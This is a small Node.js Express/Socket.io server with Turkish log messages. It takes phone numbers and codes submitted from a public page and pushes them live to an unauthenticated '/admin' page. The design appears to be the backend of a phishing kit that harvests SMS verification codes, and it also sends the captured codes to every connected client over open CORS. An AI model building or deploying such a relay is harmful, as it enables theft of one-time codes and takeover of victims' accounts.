const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

io.on("connection", (socket) => {
  console.log("SOCKET BAĞLANDI:", socket.id);

  socket.on("new-phone", (phone) => {
    console.log("SERVER PHONE ALDI:", phone);

    io.emit("admin-new-phone", {
      phone,
      date: new Date().toLocaleString('tr-TR')
    });
  });

  socket.on("new-code", (code) => {
    console.log("SERVER CODE ALDI:", code);

    io.emit("admin-new-code", {
      code,
      date: new Date().toLocaleString('tr-TR')
    });
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`SERVER ${PORT} PORTUNDA`);
});